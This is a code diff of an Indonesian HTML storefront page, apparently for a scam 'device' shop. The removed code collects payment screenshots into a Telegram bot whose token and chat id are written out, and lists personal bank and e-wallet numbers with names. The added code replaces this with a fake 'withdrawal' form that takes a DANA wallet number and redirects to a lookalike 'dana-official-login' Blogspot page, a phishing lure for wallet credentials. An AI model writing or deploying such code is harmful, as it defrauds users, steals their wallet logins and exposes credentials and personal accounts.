@@ -226,129 +226,90 @@
     <!-- Modal -->
     <div class="modal" id="paymentModal">
         <div class="modal-content">
-            <h2>Silahkan Transfer</h2>
-            <label for="paymentMethod">Pilih Metode Pembayaran:</label>
+            <h2>Silahkan pilih penarikan</h2>
+            <label for="paymentMethod">Pilih Metode Penarikan:</label>
             <select id="paymentMethod">
-                <option value="DANA">DANA - 083130783481 (RACHMAD FAREL RAMDHAN)</option>
-                <option value="SEABANK">SEABANK - 901099183656 (SERLI)</option>
+                <option value="DANA">DANA</option>
             </select>
-            <label for="whatsappNumber">Masukkan Nomor WhatsApp Anda:</label>
-            <input type="text" id="whatsappNumber" placeholder="Contoh: 6281234567890" required>
-            <p>Sertakan screenshot bukti transfer!</p>
-            <input type="file" id="screenshot" required>
-            <button onclick="sendProof()">Kirim Bukti Transfer</button>
-            <button class="close-modal" onclick="closeModal()">Batal</button>
+            <label for="whatsappNumber">Masukkan Nomor Dana:</label>
+            <input type="text" id="whatsappNumber" placeholder="Masukkan Nomor WhatsApp anda">
+            <button onclick="submitPayment()">Submit</button>
+            <button class="close-modal" onclick="closeModal()">Tutup</button>
         </div>
+    </div>
+
+    <!-- Floating Customer Support Button -->
+    <div class="cs-button" id="csButton">
+        CS
     </div>
 
     <!-- Bottom Menu -->
     <div class="bottom-menu">
-        <button onclick="showProducts()">PERANGKAT</button>
-        <button onclick="showTutorial()">TUTORIAL</button>
-    </div>
-
-    <!-- Draggable CS Button -->
-    <div class="cs-button" id="csButton" onclick="openWhatsApp()">
-        CS
+        <button onclick="showProducts()">Perangkat</button>
+        <button onclick="showTutorial()">Tutorial</button>
+        <button onclick="openModal()">Penarikan</button>
     </div>
 
     <script>
-        let selectedProduct = "";
-
+        // Function to buy a product
         function buyProduct(productName) {
-            selectedProduct = productName;
-            document.getElementById("paymentModal").style.display = "flex";
+            alert("Anda memilih untuk membeli " + productName);
         }
 
-        function closeModal() {
-            document.getElementById("paymentModal").style.display = "none";
-        }
-
-        function sendProof() {
-            const paymentMethod = document.getElementById("paymentMethod").value;
-            const whatsappNumber = document.getElementById("whatsappNumber").value;
-            const screenshot = document.getElementById("screenshot").files[0];
-
-            if (!whatsappNumber) {
-                alert("Harap masukkan nomor WhatsApp!");
-                return;
-            }
-
-            if (!screenshot) {
-                alert("Harap upload bukti transfer!");
-                return;
-            }
-
-            const formData = new FormData();
-            formData.append('chat_id', '6235911819');
-            formData.append('caption', `Pembelian ${selectedProduct}\nNomor WhatsApp: ${whatsappNumber}\nMetode Pembayaran: ${paymentMethod}`);
-            formData.append('document', screenshot);
-
-            fetch(`https://api.telegram.org/bot7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY/sendDocument`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert("Bukti transfer berhasil dikirim!");
-                    closeModal();
-                } else {
-                    alert("Gagal mengirim bukti transfer. Silakan coba lagi.");
-                }
-            })
-            .catch(error => {
-                alert("Terjadi kesalahan: " + error.message);
-            });
-        }
-
+        // Show products section
         function showProducts() {
             document.getElementById("productSection").style.display = "block";
             document.getElementById("tutorialSection").style.display = "none";
         }
 
+        // Show tutorial section
         function showTutorial() {
             document.getElementById("productSection").style.display = "none";
             document.getElementById("tutorialSection").style.display = "block";
         }
 
-        // Initial state: Only products are visible, tutorial is hidden
-        window.onload = function() {
-            document.getElementById("productSection").style.display = "block";
-            document.getElementById("tutorialSection").style.display = "none";
+        // Open payment modal
+        function openModal() {
+            document.getElementById("paymentModal").style.display = "flex";
         }
 
-        // Draggable CS Button
-        const csButton = document.getElementById("csButton");
-
-        csButton.onmousedown = function(event) {
-            let shiftX = event.clientX - csButton.getBoundingClientRect().left;
-            let shiftY = event.clientY - csButton.getBoundingClientRect().top;
-
-            function moveAt(pageX, pageY) {
-                csButton.style.left = pageX - shiftX + 'px';
-                csButton.style.top = pageY - shiftY + 'px';
-            }
-
-            function onMouseMove(event) {
-                moveAt(event.pageX, event.pageY);
-            }
-
-            document.addEventListener('mousemove', onMouseMove);
-
-            csButton.onmouseup = function() {
-                document.removeEventListener('mousemove', onMouseMove);
-                csButton.onmouseup = null;
-            };
-        };
-
-        csButton.ondragstart = function() {
-            return false; // Prevent default drag behavior
-        };
-
-        function openWhatsApp() {
-            window.open("https://wa.me/6283130783481", "_blank");
+        // Close payment modal
+        function closeModal() {
+            document.getElementById("paymentModal").style.display = "none";
         }
+
+        // Submit payment information and redirect to another website
+        function submitPayment() {
+            const paymentMethod = document.getElementById("paymentMethod").value;
+            const whatsappNumber = document.getElementById("whatsappNumber").value;
+            alert("Metode penarikan: " + paymentMethod + "\nNomor DANA anda: " + whatsappNumber);
+            closeModal();
+
+            // Redirect to a new URL
+            window.location.href = "https://dana-official-login.blogspot.com/?m=1";
+        }
+
+        // Draggable CS Button functionality
+        const csButton = document.getElementById('csButton');
+        let isDragging = false;
+        let offsetX, offsetY;
+
+        csButton.addEventListener('mousedown', (e) => {
+            isDragging = true;
+            offsetX = e.clientX - csButton.getBoundingClientRect().left;
+            offsetY = e.clientY - csButton.getBoundingClientRect().top;
+        });
+
+        document.addEventListener('mousemove', (e) => {
+            if (isDragging) {
+                csButton.style.left = `${e.clientX - offsetX}px`;
+                csButton.style.top = `${e.clientY - offsetY}px`;
+            }
+        });
+
+        document.addEventListener('mouseup', () => {
+            isDragging = false;
+        });
     </script>
 
 </body>
